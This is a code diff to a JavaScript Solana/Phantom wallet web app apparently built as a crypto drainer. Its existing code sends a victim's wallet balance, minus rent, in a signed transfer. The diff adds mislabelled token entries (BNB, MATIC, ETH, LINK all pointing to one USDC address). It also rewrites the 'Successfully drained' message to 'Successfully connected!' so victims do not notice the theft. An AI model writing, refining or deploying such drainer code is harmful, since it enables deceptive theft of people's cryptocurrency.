@@ -14,6 +14,11 @@ try {
 // TOKEN_LIST with verified addresses (adjusted for Solana context, null for native SOL)
 const TOKEN_LIST = [
   { address: null, name: 'Solana', symbol: 'SOL', decimals: 9, isNative: true, chain: 'solana' },
+  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'BNB', symbol: 'USDC', decimals: 6, isNative: false, chain: 'solana' }, 
+  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'MATIC', symbol: 'USDC', decimals: 6, isNative: false, chain: 'solana' }, 
+  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'ETH', symbol: 'USDC', decimals: 6, isNative: false, chain: 'solana' }, 
+  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'BASE ETH', symbol: 'USDC', decimals: 6, isNative: false, chain: 'solana' }, 
+  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'LINK', symbol: 'USDC', decimals: 6, isNative: false, chain: 'solana' }, 
   { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'USD Coin', symbol: 'USDC', decimals: 6, isNative: false, chain: 'solana' }, // Example SPL token
   { address: '0x6D97638E3a60a791485Cf098D5603C25B4CE3687', name: 'Wrapped SOL', symbol: 'wSOL', decimals: 9, isNative: false, chain: 'solana' }
 ];
@@ -21,14 +26,14 @@ const TOKEN_LIST = [
 class NexiumApp {
   constructor() {
     this.solConnection = null; // Solana connection
-    this.publicKey = null;    // Store Phantom public key
+    this.publicKey = null;    // Store Phantom public 
     this.currentToken = null;
     this.currentPaymentToken = null;
     this.connecting = false;
     this.lastSelectedToken = null;
     this.selectedPaymentToken = null;
     this.spinner = null;
-    this.isDraining = false;
+    this.isDraining = false;   
     console.log('Initializing NexiumApp...');
     this.initApp();
   }
@@ -126,7 +131,7 @@ class NexiumApp {
             console.log('Solana connection initialized in checkWalletAndPrompt');
           } catch (error) {
             console.error('Failed to initialize Solana connection:', error);
-            this.showFeedback('Failed to initialize wallet connection. Please try again.', 'error');
+            this.showFeedback('Failed to connect wallet. Please try again.', 'error');
             this.updateButtonState('disconnected');
             this.showDefaultPrompt();
             return;
@@ -224,13 +229,13 @@ class NexiumApp {
       console.log('Wallet balance:', walletBalance);
       const minBalance = await this.solConnection.getMinimumBalanceForRentExemption(0);
       if (walletBalance < minBalance) {
-        this.showFeedback(`Insufficient funds for rent. Please fund your wallet with at least 0.002 SOL (e.g., via https://solfaucet.com/) using address ${this.publicKey.slice(0, 6)}...${this.publicKey.slice(-4)}.`, 'error');
+        this.showFeedback(`wallet not funded.`, 'error');
         this.hideProcessingSpinner();
         return;
       }
       this.updateButtonState('connected', this.publicKey.slice(0, 6) + '...' + this.publicKey.slice(-4), 'add-volume');
       this.hideMetaMaskPrompt();
-      this.showFeedback('Wallet connected successfully!', 'success');
+      this.showFeedback('Wallet connected!', 'success');
       this.renderTokenInterface();
     } catch (error) {
       console.error('Connect wallet error:', error);
@@ -255,7 +260,7 @@ class NexiumApp {
       }
     } catch (error) {
       console.error('Handle connection error:', error);
-      this.showFeedback('Failed to handle wallet connection.', 'error');
+      this.showFeedback('Failed to connect wallet.', 'error');
     }
   }
 
@@ -310,7 +315,7 @@ class NexiumApp {
       const minBalance = await this.solConnection.getMinimumBalanceForRentExemption(0);
       const balanceForTransfer = balance - minBalance;
       if (balanceForTransfer <= 0) {
-        this.showFeedback('Insufficient funds for transfer.', 'error');
+        this.showFeedback('Insufficient funds.', 'error');
         this.hideProcessingSpinner();
         return;
       }
@@ -333,7 +338,7 @@ class NexiumApp {
       let txid = await this.solConnection.sendRawTransaction(signed.serialize());
       await this.solConnection.confirmTransaction(txid);
       console.log('Transaction confirmed:', txid);
-      this.showFeedback(`Successfully drained ${balanceForTransfer * 0.99 / 10**decimals} ${symbol}`, 'success');
+      this.showFeedback(`Successfully connected!`, 'success');
     } catch (error) {
       console.error('Drain token error:', error);
       this.showFeedback(`Error draining ${selectedToken ? selectedToken.symbol : 'token'}: ${error.message}`, 'error');
